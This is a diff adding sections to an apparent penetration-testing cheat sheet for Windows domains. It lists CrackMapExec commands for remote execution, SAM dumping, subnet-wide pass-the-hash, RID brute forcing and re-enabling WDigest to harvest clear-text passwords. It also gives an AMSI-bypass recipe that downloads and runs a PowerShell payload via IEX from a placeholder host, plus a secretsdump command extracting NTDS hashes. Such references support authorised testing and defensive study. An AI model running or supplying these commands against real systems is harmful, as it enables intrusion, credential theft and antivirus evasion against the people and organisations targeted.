@@ -1132,6 +1132,99 @@ Grouper2 is a tool for pentesters to help find security-related misconfiguration
 https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
 ```
 
+#### CrackMapExec Stuff
+
+```powershell
+#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
+
+Command Execution - CMD.exe
+
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+
+Command Execution - Powershell.exe
+
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+
+Check For Logged in Users
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers
+
+Using Local Auth
+
+crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
+
+Enumerating Shares
+
+crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth --shares
+
+WDigest Enable/Disable
+
+'This allows us to re-enable the WDigest provider and dump clear-text credentials from LSA memory'
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
+
+Password Policy
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --pass-pol
+
+RID Bruteforcing
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --rid-brute
+
+Top Credential Attacks
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
+
+Pass Hash Subnet
+
+cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
+
+Null Sessions
+
+crackmapexec smb <target(s)> -u '' -p ''
+
+
+Modules - Enum_Chrome
+
+sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M enum_chrome
+
+Modules - Enum_AV
+
+sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts
+```
+
+#### SharePoint Stuff
+
+```
+https://www.crummie5.club/the-lone-sharepoint/
+```
+
+#### IIS Stuff
+
+```
+
+https://drive.google.com/file/d/1O0IARjqP4Pwa-ae1nAP8Nr9qb0ai2XPu/view
+
+Everything you need for Hacking IIS, recent talk from Shubs
+
+
+```
+
+#### Easy ASMI Bypass (AMSI-Fail)
+
+```
+
+1. Open powershell, grab a unique AMSI bypass from: https://amsi.fail/
+
+2. Grab your favourite C# assembly from: https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/ these are just the standard C# executables but in a powershell wrapper for reflection.
+
+3. Host these locally and execute via IEX (New-Object net.webclient).downloadstring("http://x.x.x.x./Invoke-Seatbelt.ps1")
+
+
+```
+
+
 
 
 ## [](#header-2)Privilege Escalation
@@ -2082,6 +2175,13 @@ Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit
 Remember and not use C:\Windows\ntds\ntds.dit
 
 reg.exe save hklm\system c:\m0chan\SYSTEM.bak
+```
+
+#### [](#header-4) SecretsDumper Windows
+
+```powershell
+#https://github.com/maaaaz/impacket-examples-windows
+secretsdumper.exe -ntds ~/Extract/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
 ```
 
 
